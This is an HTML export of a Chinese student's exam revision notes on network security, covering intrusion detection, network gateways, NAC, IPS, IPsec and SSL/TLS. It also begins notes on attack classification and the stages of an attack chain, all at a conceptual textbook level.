title="8.2.入侵检测模型"></a>8.2.入侵检测模型</h2><ul><li>通用入侵检测模型（Denning模型）</li><li>层次化入侵检测模型（IDM）</li><li>管理式入侵检测模型（SNMP-IDSM）</li></ul><p>IDS分析技术分类</p><ul><li>异常检测：通过采集和统计来发现网络或系统中可能出现的异常行为，向管理员提出警告。（黑白名单）</li><li>特征检测：通过对采集的信息按已知的知识进行分析，来发现正在发生和已经发生的入侵行为。</li></ul><table><thead><tr><th>分析策略</th><th>特征检测</th><th>异常检测</th></tr></thead><tbody><tr><td>缺省即允许</td><td>基于信号的特征检测</td><td>基于机器学习的异常检测</td></tr><tr><td>缺省即禁止</td><td>基于策略的特征检测</td><td>基于轮廓的异常检测</td></tr></tbody></table><blockquote><p>缺省（Default）设置是预设的、用户无需进行任何配置即可使用的设置。</p><ul><li><strong>缺省即允许</strong>：<ul><li>在这种策略下，如果没有特定的规则来禁止某个行为或访问，那么这个行为或访问就是被允许的。这意味着系统默认允许所有未被明确禁止的活动。<ul><li>在特征检测中，这可能意味着基于信号的特征检测，即系统默认允许所有未被识别为恶意信号的活动。</li><li>在异常检测中，这可能意味着基于机器学习的异常检测，即系统默认允许所有未被机器学习模型识别为异常的行为。</li></ul></li></ul></li><li><strong>缺省即禁止</strong>：<ul><li>在这种策略下，如果没有特定的规则来允许某个行为或访问，那么这个行为或访问就是被禁止的。这意味着系统默认禁止所有未被明确允许的活动。<ul><li>在特征检测中，这可能意味着基于策略的特征检测，即系统默认禁止所有未被策略明确允许的活动。</li><li>在异常检测中，这可能意味着基于轮廓的异常检测，即系统默认禁止所有未被定义为正常行为的活动。</li></ul></li></ul></li></ul></blockquote><h2 id="8-3-异常检测"><a href="#8-3-异常检测" class="headerlink" title="8.3.异常检测"></a>8.3.异常检测</h2><ul><li><p>也称为基于<strong>行为</strong>的检测</p></li><li><p>首先<u>建立起用户的正常使用模式，即知识库</u></p></li><li><p>标识出<u>不符合正常模式</u>的行为活动</p></li><li><p>假设所有的入侵行为是异常的</p></li><li><p>基于系统和基于用户的异常</p></li><li><p>比较符合安全的概念，但是实现难度较大</p><ul><li>正常模式的知识库难以建立</li><li>难以明确划分正常模式和异常模式</li></ul></li></ul><h2 id="8-4-特征检测"><a href="#8-4-特征检测" class="headerlink" title="8.4.特征检测"></a>8.4.特征检测</h2><ul><li>也称为<strong>误用</strong>检测</li><li>是针对已知（类似）的攻击行为和间接的违背系统安全策略行为的检测，攻击和系统漏洞库是特征检测的基础。</li><li>建立入侵行为模型(攻击特征库)</li><li>判别当前行为活动是否符合已知的攻击模式</li><li>假设可以识别和表示所有可能的特征</li><li>基于系统的和基于用户</li><li>目前研究工作比较多，并且已经进入实用</li></ul><p>优点：</p><ul><li><p>准确率高</p></li><li><p>算法简单</p></li></ul><p>关键问题：</p><ul><li>有所有的攻击特征，建立完备的特征库</li><li>特征库要不断更新（动态性）</li><li>无法检测新的入侵</li></ul><p>数据来源</p><ul><li><p>审计日志或网络流量</p></li><li><p>特殊用途的数据收集机制</p></li></ul><h2 id="8-5-IDS的两个指标"><a href="#8-5-IDS的两个指标" class="headerlink" title="8.5.IDS的两个指标"></a>8.5.IDS的两个指标</h2><ul><li>漏报率(false negative) <ul><li>指攻击事件没有被IDS检测到</li></ul></li><li>误报率(false alarm rate) <ul><li>把正常事件识别为攻击并报警</li><li>误报率与检出率成<strong>正比例</strong>关系</li></ul></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 22.24.34.png" alt="截屏2024-12-25 22.24.34" style="zoom: 25%;" /><h1 id="CH9-其他网络安全技术及设备"><a href="#CH9-其他网络安全技术及设备" class="headerlink" title="CH9-其他网络安全技术及设备"></a>CH9-其他网络安全技术及设备</h1><p>应对网络安全漏洞的传统解决办法</p><blockquote><ul><li>“电子政务网络由政务内网和政务外网构成，两网之间物理隔离，政务外网与互联网之间逻辑隔离。” </li><li>“涉及国家秘密的计算机信息系统，不得直接或间接地与国际互联网或其他公共信息相连接，必须实行物理隔离”。 </li><li>一些组织根据自身业务的特点，在有不同安全需求的网络之间也采取了物理隔离的措施。</li></ul><p>物理隔离的核心思想是不连接，没有连接。</p></blockquote><p>物理隔离带来的问题</p><blockquote><ul><li>物理隔离使得正常的信息交流被阻断了</li><li>部分重要的与业务相关的数据需要在涉密网络和非涉密网络间交换，但由于物理隔离无法实现</li><li>物理隔离也成为电子政务、电子商务的数据传输应用的瓶颈</li></ul></blockquote><p>传统物理隔离的应用解决方案分析</p><blockquote><p>优点</p><ul><li>保持了网络间物理隔离的特性，有效防止了对涉密网络的直接网络攻击</li></ul><p>缺点</p><p>延时长、速度慢、能够满足的应用过于单一、可靠性低、在防病毒、内容过滤等方面效果较差、人工操作风险高</p></blockquote><blockquote><h4 id="安全隔离与信息交换系统（网闸）"><a href="#安全隔离与信息交换系统（网闸）" class="headerlink" title="安全隔离与信息交换系统（网闸）"></a>安全隔离与信息交换系统（网闸）</h4><h6 id="传统"><a href="#传统" class="headerlink" title="传统"></a>传统</h6><p>物理隔离<br>核心思想是不连接</p><h6 id="什么是网闸"><a href="#什么是网闸" class="headerlink" title="什么是网闸"></a>什么是网闸</h6><p>用于在两个隔离程度较高的网络之间进行安全的数据交换。<br>至少需要两套主机和一个隔离部件。</p><h6 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h6><p>内端机、外端机、隔离系统</p><h6 id="网闸与防火墙"><a href="#网闸与防火墙" class="headerlink" title="网闸与防火墙"></a>网闸与防火墙</h6><p>防火墙：保证互联互通，尽量安全<br>网闸：保证安全，尽量互联互通</p></blockquote><h2 id="9-1-网闸"><a href="#9-1-网闸" class="headerlink" title="9.1.网闸"></a>9.1.网闸</h2><blockquote><p>网闸：在不同的安全域之间，通过特殊的通讯协议实现数据的安全交换。</p></blockquote><ul><li>网闸是在<u>两个不同安全域之间</u>，通过（特殊的通讯）协议转换的手段，以信息摆渡的方式实现数据交换，且只有被系统明确要求传输的信息才可以通过。其信息流一般为通用应用服务。</li><li>在信息摆渡的过程中内外网（上下游）通过策略控制连接发生，所以“网闸产品”<u>必须要有至少两套主机和一个隔离部件</u>才可完成物理隔离任务。</li><li>网闸主要用于在两个隔离程度高的网络之间进行<strong>安全的</strong>数据交换。</li></ul><h2 id="9-2-安全隔离网闸的组成"><a href="#9-2-安全隔离网闸的组成" class="headerlink" title="9.2.安全隔离网闸的组成"></a>9.2.安全隔离网闸的组成</h2><p>（概念、原理+画出网闸的三个组成部分，再简单说明原理+关键字“私有协议”、“切断”）</p><p>（要画图，关注安全隔离网闸的组成图里的小字，“<strong><u>私有协议</u></strong>”！考题类似于“画出三个组成部分并说明原理”）</p><ul><li>由内端机、外端机、隔离系统（也称数据迁移控制单元）三部分组成</li></ul><p><img src="/./attachments/image-20241225230817366.png" alt="image-20241225230817366"></p><ul><li>原理：<ul><li><strong>切断</strong>网络之间的<strong>通用协议连接</strong>；</li><li>将数据包进行分解或重组为静态数据；</li><li>对静态数据进行安全审查，包括网络协议检查和代码扫描等；</li><li>确认后的安全数据流入内部单元。</li></ul></li></ul><h2 id="9-3-数据隔离交换过程"><a href="#9-3-数据隔离交换过程" class="headerlink" title="9.3.数据隔离交换过程"></a>9.3.数据隔离交换过程</h2><p>![截屏2024-12-25 23.20.59](.&#x2F;attachments&#x2F;截屏2024-12-25 23.20.59.png)</p><h2 id="9-4-网络准入控制-NAC（Network-Access-Control）"><a href="#9-4-网络准入控制-NAC（Network-Access-Control）" class="headerlink" title="9.4.网络准入控制-NAC（Network Access Control）"></a>9.4.网络准入控制-NAC（Network Access Control）</h2><h3 id="9-4-1-NAC概念"><a href="#9-4-1-NAC概念" class="headerlink" title="9.4.1.NAC概念"></a>9.4.1.NAC概念</h3><p>使用网络准入安全策略，确保进入网络的设备符合策略。</p><p>![截屏2024-12-26 15.15.38](.&#x2F;attachments&#x2F;截屏2024-12-26 15.15.38.png)</p><h3 id="9-4-2-网络准入控制系统的功能需求"><a href="#9-4-2-网络准入控制系统的功能需求" class="headerlink" title="9.4.2.网络准入控制系统的功能需求"></a>9.4.2.网络准入控制系统的功能需求</h3><p>![截屏2024-12-26 15.19.24](.&#x2F;attachments&#x2F;截屏2024-12-26 15.19.24.png)</p><h3 id="用户流程"><a href="#用户流程" class="headerlink" title="用户流程"></a>用户流程</h3><p>用户尝试访问某网页或客户端，NAC先对用户进行检查</p><ul><li>未登录：重定向到登录界面</li><li>设备不符合安全策略或登录失败：拒绝接入，分配一个隔离角色，使其访问在线修复资源</li><li>通过检查：获得接入许可</li></ul><h3 id="9-4-3-网络准入控制系统的主要功能"><a href="#9-4-3-网络准入控制系统的主要功能" class="headerlink" title="9.4.3.网络准入控制系统的主要功能"></a>9.4.3.网络准入控制系统的主要功能</h3><ul><li>认证与授权</li><li>扫描与评估</li><li>隔离与实施</li><li>更新与修复</li></ul><h2 id="9-5-入侵防御系统"><a href="#9-5-入侵防御系统" class="headerlink" title="9.5.入侵防御系统"></a>9.5.入侵防御系统</h2><p>IPS与IDS技术同源各有侧重。ips是ids和防火墙的融合</p><p>概念：</p><p>IPS是一种<strong>集入侵检测和防御于一体</strong>的安全产品，它不但能检测入侵的发生，而且能通过一定的响应方式，实时地中止入 侵行为的发生和发展，实时地保护信息系统不受实质性的攻击。<strong>IPS使得IDS和防火墙走向统一</strong>。<strong><u>简单地理解，可认为 IPS就是防火墙加上入侵检测系统</u></strong>。</p><p>功能：</p><ul><li>识别对网络和主机的恶意攻击，并实时进行阻断；</li><li>向管理控制台发送日志信息；</li><li>集成病毒过滤、带宽管理和URL过滤等功能；</li></ul><p>（下两张表提了一嘴仅仅，“所以他的部署上的和设计上的对比，那么vpn”）</p><p><strong>部署方式对比</strong></p><table><thead><tr><th>IPS</th><th>IDS</th></tr></thead><tbody><tr><td>在线, 流量必须通过IPS</td><td>旁路, 通过镜像获得数据</td></tr><tr><td>实时, 其时延必须满足业务要求</td><td>准实时, 可接受秒级时延</td></tr><tr><td>立刻影响网络报文</td><td>对网络及业务无直接影响</td></tr><tr><td>作用范围有限制</td><td>监控范围广</td></tr></tbody></table><p><strong>设计出发点对比</strong></p><table><thead><tr><th>IPS</th><th>IDS</th></tr></thead><tbody><tr><td>无误报</td><td>无漏报</td></tr><tr><td>满足峰值流量和时延要求</td><td>满足平均流量, 可接受秒级时延</td></tr><tr><td>不能影响业务系统可用性</td><td>只需关注自身功能实现</td></tr></tbody></table><h1 id="CH10-虚拟专用网技术"><a href="#CH10-虚拟专用网技术" class="headerlink" title="CH10-虚拟专用网技术"></a>CH10-虚拟专用网技术</h1><h2 id="10-1-VPN概念"><a href="#10-1-VPN概念" class="headerlink" title="10.1.VPN概念"></a>10.1.VPN概念</h2><ul><li><p>在公用网络上建立专用网络，进行安全通讯。在企业网络中有广泛应用。</p></li><li><p>VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。</p></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-26 15.37.42.png" alt="截屏2024-12-26 15.37.42" style="zoom: 25%;" /><h2 id="10-2-VPN的主要协议-IPsec协议、SSL协议"><a href="#10-2-VPN的主要协议-IPsec协议、SSL协议" class="headerlink" title="10.2.VPN的主要协议-IPsec协议、SSL协议"></a>10.2.VPN的主要协议-IPsec协议、SSL协议</h2><h3 id="10-2-1-IPsec协议"><a href="#10-2-1-IPsec协议" class="headerlink" title="10.2.1.IPsec协议"></a>10.2.1.IPsec协议</h3><ul><li>IPSec协议实际上是一个协议包而不是一个单个的协议。 自从1995年IPSec的研究究工作开始以来，现在已经积累了大量的标准文件集，保护网络层安全。</li><li>IPSec的安全协议由三个主要的协议组成，它由下图的第二层以及加密和鉴别算法组成。</li><li>Internet安全协商和密钥管理协议（ISAKMP）是 IPSec的另一个主要组件。ISAKMP提供了用于应用层 服务的通用格式，它支持IPSec协商方的密钥管理需求。</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-26 15.40.31.png" alt="截屏2024-12-26 15.40.31" style="zoom: 25%;" /><h4 id="10-2-1-1-鉴别头部-AH"><a href="#10-2-1-1-鉴别头部-AH" class="headerlink" title="10.2.1.1.鉴别头部-AH"></a>10.2.1.1.鉴别头部-AH</h4><p>（关注数据包的结构，有头没尾）</p><p>主要实现的是<strong>鉴别</strong>功能。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-26 16.02.01.png" alt="截屏2024-12-26 16.02.01" style="zoom: 25%;" /><ul><li>AH的两种工作模式<ul><li>根据AH头插入IP包的位置不同，AH有<strong>传输模式</strong>和<strong>隧道模式</strong>两种工作模式</li></ul></li></ul><h5 id="10-2-1-1-1-AH传输模式"><a href="#10-2-1-1-1-AH传输模式" class="headerlink" title="10.2.1.1.1.AH传输模式"></a>10.2.1.1.1.AH传输模式</h5><p>AH头插入原IP头后面</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-26 15.43.52.png" alt="截屏2024-12-26 15.43.52" style="zoom: 25%;" /><h5 id="10-2-1-1-2-AH隧道模式"><a href="#10-2-1-1-2-AH隧道模式" class="headerlink" title="10.2.1.1.2.AH隧道模式"></a>10.2.1.1.2.AH隧道模式</h5><p>AH头插入原IP头前面，并在AH头前面放一个协议字段是51的新IP头</p><p>AH的隧道模式将AH头插入原IP分组的IP头之前，并在AH头之前添加新的IP头，这个新的IP头的协议字段将是<strong>51</strong>，以表明IP头之后的是一个AH头</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-26 15.44.55.png" alt="截屏2024-12-26 15.44.55" style="zoom: 25%;" /><h4 id="10-2-1-2-负载安全封装ESP"><a href="#10-2-1-2-负载安全封装ESP" class="headerlink" title="10.2.1.2.负载安全封装ESP"></a>10.2.1.2.负载安全封装ESP</h4><p>（关注数据包的结构细节，有头有尾）</p><p>1）把整个IP分组或传输层协议部分封装到ESP载荷中，进行安全处理，实现机密性和完整性保护。ESP具备AH的全部功能，还能保证机密性。<br>2）ESP只鉴别ESP头之后的信息，AH还要对外部IP头各部分进行鉴别。<br>3）两套算法：负责保护机密性的加密算法和负责进行身份验证的鉴别算法</p><p><strong>ESP的两种工作模式</strong></p><p>与AH机制相类似，根据ESP封装的载荷内容不同，ESP头可选用两种方式中的一种来应用于IP数据包，即<strong>传送模式或隧道模式</strong>，其间的差别决定了ESP保护的真正对象是什么</p><h5 id="10-2-1-2-1-传输模式"><a href="#10-2-1-2-1-传输模式" class="headerlink" title="10.2.1.2.1.传输模式"></a>10.2.1.2.1.传输模式</h5><p>在原IP头后面插入ESP头，封装后面的TCP&#x2F;UDP头和数据。原IP头的协议字段会变成50.</p><p>![截屏2024-12-26 15.49.52](.&#x2F;attachments&#x2F;截屏2024-12-26 15.49.52.png)</p><h5 id="10-2-1-2-1-隧道模式"><a href="#10-2-1-2-1-隧道模式" class="headerlink" title="10.2.1.2.1.隧道模式"></a>10.2.1.2.1.隧道模式</h5><p>在隧道模式，整个IP包（包括原IP包头）都被封装在ESP有效载荷中，并<strong>产生一个新IP头附着在ESP头之前</strong>，这个新的IP头的协 议字段将是50，以表明IP头之后的是一个ESP头</p><blockquote><p>封装原IP头、TCP&#x2F;UDP头和数据，在原IP头前面插入ESP头，最前面是协议字段为50的新IP头。相当于先把包括IP头在内的整个IP包加密封装到新IP包中。<br>特点：对被保护子网中的用户透明；子网内不需要用公网IP；子网内部拓扑结构被保护</p></blockquote><p>![截屏2024-12-26 15.51.23](.&#x2F;attachments&#x2F;截屏2024-12-26 15.51.23.png)</p><h2 id="10-3-VPN通道的建立方式"><a href="#10-3-VPN通道的建立方式" class="headerlink" title="10.3.VPN通道的建立方式"></a>10.3.VPN通道的建立方式</h2><ul><li>Host 对 Host</li><li>Host 对 VPN 网关</li><li>VPN 对 VPN 网关</li><li>Remote User 对 VPN 网关</li></ul><h3 id="10-3-1-VPN通道的建立方式-Host-对-Host"><a href="#10-3-1-VPN通道的建立方式-Host-对-Host" class="headerlink" title="10.3.1.VPN通道的建立方式-Host 对 Host"></a>10.3.1.VPN通道的建立方式-Host 对 Host</h3><ul><li>该模式要求两边主机都支持IPSec </li><li>VPN网关可支持也可不支持IPSec</li></ul><p>![截屏2024-12-26 16.24.59](.&#x2F;attachments&#x2F;截屏2024-12-26 16.24.59.png)</p><h3 id="10-3-2-VPN通道的建立方式-Host-to-VPN-模式："><a href="#10-3-2-VPN通道的建立方式-Host-to-VPN-模式：" class="headerlink" title="10.3.2.VPN通道的建立方式-Host to VPN 模式："></a>10.3.2.VPN通道的建立方式-Host to VPN 模式：</h3><ul><li><p>该模式要求host方主机支持IPSec </p></li><li><p>VPN网关VPN一侧需要支持IPSec</p></li></ul><p>![截屏2024-12-26 16.25.40](.&#x2F;attachments&#x2F;截屏2024-12-26 16.25.40.png)</p><h3 id="10-3-3-VPN通道的建立方式-VPN-to-VPN-模式："><a href="#10-3-3-VPN通道的建立方式-VPN-to-VPN-模式：" class="headerlink" title="10.3.3.VPN通道的建立方式-VPN to VPN 模式："></a>10.3.3.VPN通道的建立方式-VPN to VPN 模式：</h3><ul><li><p>该模式不要求主机支持IPSec </p></li><li><p>两边的VPN网关必须支持IPSec</p></li></ul><p>![截屏2024-12-26 16.26.29](.&#x2F;attachments&#x2F;截屏2024-12-26 16.26.29.png)</p><h3 id="10-3-4-VPN通道的建立方式-Remote-User-to-VPN-网关"><a href="#10-3-4-VPN通道的建立方式-Remote-User-to-VPN-网关" class="headerlink" title="10.3.4.VPN通道的建立方式-Remote User to  VPN 网关"></a>10.3.4.VPN通道的建立方式-Remote User to  VPN 网关</h3><ul><li>该模式不要求网关内主机支持IPSec</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-26 16.27.08.png" alt="截屏2024-12-26 16.27.08" style="zoom: 25%;" /><h2 id="10-4-传输层安全协议及其应用-SSL"><a href="#10-4-传输层安全协议及其应用-SSL" class="headerlink" title="10.4.传输层安全协议及其应用-SSL"></a>10.4.传输层安全协议及其应用-SSL</h2><ul><li>SSL协议<ul><li>Secure Sockets Layer （安全套接层)</li><li>广泛地用于Web浏览器与服务器之间的身份认证和加密数据传输 （<strong><u>实例应用：HTTPS</u></strong>）</li><li>SSL协议提供的<u>服务主要有</u>：<ul><li>认证用户和服务器，确保数据发送到正确的客户机和服务器</li><li>加密数据以防止数据中途被窃取</li><li>维护数据的完整性，确保数据在传输过程中不被改变</li></ul></li></ul></li></ul><h3 id="10-4-1-SSL握手协议行为过程"><a href="#10-4-1-SSL握手协议行为过程" class="headerlink" title="10.4.1.SSL握手协议行为过程"></a>10.4.1.SSL握手协议行为过程</h3><p>![截屏2024-12-26 16.59.06](.&#x2F;attachments&#x2F;截屏2024-12-26 16.59.06.png)</p><p>![截屏2024-12-26 17.03.33](.&#x2F;attachments&#x2F;截屏2024-12-26 17.03.33.png)</p><blockquote><p>SSL &#x2F; TLS 握手详细过程</p></blockquote><ol><li>**”client hello”消息：**客户端通过发送”client hello”消息向服务器发起握手请求，该消息包含了客户端所支持的 TLS 版本和密码组合以供服务器进行选择，还有一个”client random”随机字符串。</li><li>**”server hello”消息：**服务器发送”server hello”消息对客户端进行回应，该消息包含了数字证书，服务器选择的密码组合和”server random”随机字符串。</li><li>**验证：**客户端对服务器发来的证书进行验证，确保对方的合法身份，验证过程可以细化为以下几个步骤：<ol><li>检查数字签名</li><li>验证证书链 (这个概念下面会进行说明)</li><li>检查证书的有效期</li><li>检查证书的撤回状态 (撤回代表证书已失效)</li></ol></li><li>**”premaster secret”字符串：**客户端向服务器发送另一个随机字符串”premaster secret (预主密钥)”，这个字符串是经过服务器的公钥加密过的，只有对应的私钥才能解密。</li><li>**使用私钥：**服务器使用私钥解密”premaster secret”。</li><li><strong>生成共享密钥</strong>：客户端和服务器均使用 client random，server random 和 premaster secret，并通过相同的算法生成相同的共享密钥 <strong>KEY</strong>。</li><li>**客户端就绪：**客户端发送经过共享密钥 <strong>KEY</strong>加密过的”finished”信号。</li><li>**服务器就绪：**服务器发送经过共享密钥 <strong>KEY</strong>加密过的”finished”信号。</li><li>**达成安全通信：**握手完成，双方使用对称加密进行安全通信。</li></ol><h3 id="10-4-2-SSL记录协议"><a href="#10-4-2-SSL记录协议" class="headerlink" title="10.4.2.SSL记录协议"></a>10.4.2.SSL记录协议</h3><ul><li>SSL记录协议。为SSL连接提供了两种服务<ul><li><strong>机密性</strong>：**<u>握手协议？？？？</u>**为SSL有效载荷的常规密码定义共享秘密密钥。</li><li><strong>消息完整性</strong>：握手协议为生成MAC定义共享秘密密钥。</li></ul></li><li>记录协议发出传输请求消息，把数据分段成可以操作的数据块，还可以选择压缩数据，加入MAC信息，加密，加入文件头，在TCP段中传输结果单元。接收到的数据需要解密、身份验证、解压、重组，然后才能交付.</li></ul><h3 id="10-4-3-SSL应用实例-HTTPS"><a href="#10-4-3-SSL应用实例-HTTPS" class="headerlink" title="10.4.3.SSL应用实例-HTTPS"></a>10.4.3.SSL应用实例-HTTPS</h3><ul><li>HTTPS（**全称：Hypertext Transfer Protocol over Secure Socket Layer，**超文本传输安全协议），是HTTP的安全版。</li><li>HTTPS的<strong>安全基础是SSL</strong>，通过<strong>结合HTTP和SSL</strong>来实现Web浏览器和Web服务器之间的安全通信。</li><li>HTTPS已经融合在当今的<strong>Web浏览器</strong>中，只要Web服务器支持HTTPS，就可以使用。</li><li>HTTPS现在已广泛用于Intenet上的安全B&#x2F;S应用，例如网上交易等</li><li>HTTPS的规范文档可参阅RFC 2818（HTTPS Over TLS）</li></ul><h4 id="10-4-3-1-HTTPS通信过程（单向鉴别）"><a href="#10-4-3-1-HTTPS通信过程（单向鉴别）" class="headerlink" title="10.4.3.1.HTTPS通信过程（单向鉴别）"></a>10.4.3.1.HTTPS通信过程（单向鉴别）</h4><p>（图会画，会描述全过程）</p><p><img src="/./attachments/image-20241226171518450.png" alt="image-20241226171518450"></p><p>1、客户端向服务器发起连接请求</p><p>2、服务器生成公私钥对，通过可信机构对公钥等信息进行数字签名，形成服务器证书</p><p>3、服务器发送证书响应请求</p><p>4、客户端验证服务器证书，生成数据加密密钥，并采用服务器证书中的公钥对数据加密密钥进行保护</p><p>5、客户端向服务器发送加密后的数据加密密钥</p><p>6、服务器用私钥解密出数据加密密钥，并用该密钥加密要传输的静荷数据</p><p>7、客户端用数据加密密钥解密服务器传来的数据。</p><h3 id="10-4-4-SSL安全性"><a href="#10-4-4-SSL安全性" class="headerlink" title="10.4.4.SSL安全性"></a>10.4.4.SSL安全性</h3><p>（会考一个判断题，“在有限范围内，不涉及国家重要基础设施的时候可以使用SSL，但是不能用于政府、国防、军事中，因为技术限制，进口我国的ssl底层的RSA的安全性不够高，且不符合《商用密码管理条例》”）</p><p>SSL标准协议存在着以下不容忽视的缺点</p><ul><li>不符合《商用密码管理条例》中对商用密码产品<strong>不得使用国外密码算法</strong>的规定。</li><li><strong>系统安全性还不够强</strong>。SSL协议的数据安全性其实就是建立在RSA等算法的安全性上，因此从本质上来讲，攻破RSA等算法就等同于攻破此协议。由于美国政府的出口限制，使得进入我国的实现了SSL的产品（Web浏览器和服务器）均只能提供512比特RSA公钥、40比特对称密钥的加密。显然，攻破此协议并不太难</li></ul>]]></content>
      
      
      <categories>
          
          <category> SCU </category>
          
          <category> 2024-2025学年 </category>
          
          <category> 网络空间安全技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防技术期末重点</title>
      <link href="/blog/2025/01/16/SCU/2024-2025%E5%AD%A6%E5%B9%B4/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%9C%9F%E6%9C%AB%E9%87%8D%E7%82%B9/"/>
      <url>/blog/2025/01/16/SCU/2024-2025%E5%AD%A6%E5%B9%B4/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%9C%9F%E6%9C%AB%E9%87%8D%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h1><ul><li><p>从实验中选考试内容，重点关注：shellcode、缓冲区溢出、xss攻击、tcp（ip欺骗）、dns</p></li><li><p>题型：</p><ul><li>选择题（基本概念）</li><li>简答题</li><li>综合分析题（出自实验）</li></ul></li></ul><blockquote><p>注意ppt里的颜色，注意实验！</p></blockquote><h1 id="0-重点关注实验！"><a href="#0-重点关注实验！" class="headerlink" title="0.重点关注实验！"></a>0.重点关注实验！</h1><h1 id="1-网络攻击技术"><a href="#1-网络攻击技术" class="headerlink" title="1.网络攻击技术"></a>1.网络攻击技术</h1><p>考的内容少，只有概念，看看第一章ppt！</p><ul><li><strong>攻击分类的标准及类别</strong>（那些是主动攻击，那些是被动攻击-如后门漏洞；还有那些是物理攻击，中间人攻击）</li><li><strong>攻击步骤与方法</strong>，每个步骤的详细理解（攻击链：信息收集、权限获取、安装后门、扩大影响、删除痕迹）</li><li>物理攻击与社会工程学</li></ul><h2 id="1-1-攻击分类的标准及类别"><a href="#1-1-攻击分类的标准及类别" class="headerlink" title="1.1.攻击分类的标准及类别"></a>1.1.攻击分类的标准及类别</h2><p>（那些是主动攻击，那些是被动攻击-如后门漏洞；还有那些是物理攻击，中间人攻击）</p><hr><p>日常对网络攻击的分类并不严谨，学术上攻击分类从入侵检测需求出发，要求遵循以下<strong>标准</strong>：</p><ul><li>互斥性（分类类别不应重叠）</li><li>完备性（覆盖所有可能的攻击）</li><li>非二义性（类别划分清晰）</li><li>可重复性（对一个样本多次分类结果一致）</li><li>可接受性（符合逻辑和直觉）</li><li>实用性（可用于深入研究和调查）</li></ul><hr><p>从攻击者的角度，按照攻击发生时，攻击者与被攻击者之间的交互关系进行分类，可以将网络攻击分为：</p><ul><li>物理攻击（也称本地攻击，Local Attack）<ul><li>指攻击者通过实际接触被攻击的主机实施的各种攻击方法</li></ul></li><li>主动攻击（Server-side Attack）<ul><li>指攻击者利用Web、FTP、Telnet等开放网络服务对目标实施的各种攻击。</li><li>SQL注入攻击，攻击者通过在Web表单输入恶意的SQL代码，当这些代码被服务器执行时，可以获取、篡改或删除数据库中的数据。</li><li>分布式拒绝服务（DDoS）攻击，攻击者控制大量僵尸网络对目标服务器发起海量请求，导致服务器资源耗尽，正常用户无法访问。</li></ul></li><li>被动攻击（Client-side Attack）<ul><li>攻击者利用浏览器、邮件接收程序、文字处理程序等客户端应用程序漏洞或系统用户弱点，对目标实 的各种攻击。<ul><li>跨站脚本（XSS）攻击，攻击者在网页中注入恶意脚本，当其他用户浏览该网页时，脚本会在用户的浏览器上执行，可能盗取用户的会话信息或执行其他恶意操作。</li><li>钓鱼攻击，通过发送看似合法的电子邮件诱骗用户点击链接或下载附件，从而窃取用户的登录凭证或安装恶意软件。</li></ul></li></ul></li><li>中间人攻击（Man-in-Middle Attack）<ul><li>指攻击者处于被攻击主机的某个网络应用的中间人位置，进行数据窃听、破坏或篡改等攻击</li></ul></li></ul><h2 id="1-2-攻击的步骤和方法"><a href="#1-2-攻击的步骤和方法" class="headerlink" title="1.2.攻击的步骤和方法"></a>1.2.攻击的步骤和方法</h2><p>每个步骤的详细理解（攻击链：信息收集、权限获取、安装后门、扩大影响、删除痕迹）</p><hr><p>攻击步骤：</p><ul><li>信息收集<ul><li>任务与目的：尽可能多地收集目标的相关信息，为后续的“精确”攻击建立基础。</li><li>主要方法： 主动攻击<ul><li>利用公开信息服务</li><li>主机扫描与端口扫描</li><li>操作系统探测与应用程序类型识别</li></ul></li></ul></li><li>权限获取<ul><li>任务与目的： 获取目标系统的读、写、执行等权限。</li><li>主要方法： <ul><li>主动攻击<ul><li>口令攻击</li><li>缓冲区溢出</li><li>脚本攻击</li></ul></li><li>被动攻击<ul><li>特洛伊木马</li><li>使用邮件、IM等发送恶意链接</li></ul></li></ul></li></ul></li><li>安装后门<ul><li>任务与目的： 在目标系统中安装后门程序，以更加方便、更加隐蔽的方式对目标系统进行操控。</li><li>主要方法：<ul><li>主机控制木马</li><li>Web服务控制木马</li></ul></li></ul></li><li>扩大影响<ul><li>任务与目的：以目标系统为“跳板”，对目标所属网络的其它主机进行攻击，最大程度地扩大攻击的效果。</li><li>主要方法：<ul><li>可使用远程攻击主机的所有攻击方式</li><li>还可使用局域网内部攻击所特有的嗅探、假消息攻击等方法</li></ul></li></ul></li><li>删除痕迹<ul><li>任务与目的：清除攻击的痕迹，以尽可能长久地对目标进行控制，并防止被识别、追踪。</li><li>主要方法：<ul><li>Rootkit隐藏</li><li>系统安全日志清除</li><li>应用程序日志清除</li></ul></li></ul></li></ul><h2 id="1-3-物理攻击与社会工程学"><a href="#1-3-物理攻击与社会工程学" class="headerlink" title="1.3.物理攻击与社会工程学"></a>1.3.物理攻击与社会工程学</h2><p>物理攻击</p><ul><li>物理攻击定义<ul><li>通过各种技术手段绕开<u>物理安全防护体系</u>，从而进入<u>受保护的设施场所或设备资源内</u>，获取或破坏信息系统物理媒体中受保护信息的攻击方式</li></ul></li><li>经典物理攻击场景<ul><li>《碟中谍1》之潜入中央情报局偷取 NOC名单</li><li>《越狱》之闯入Company总部偷取Scylla</li></ul></li><li>物理攻击并非遥不可及<ul><li>宾馆的锁并不安全</li><li>《战争游戏》便贴纸上窥视到教务系统登录口令</li><li>1978年“最大的计算机诈骗案”</li><li>实验室中笔记本电脑被盗</li></ul></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 15.49.31.png" alt="截屏2024-12-27 15.49.31" style="zoom: 33%;" 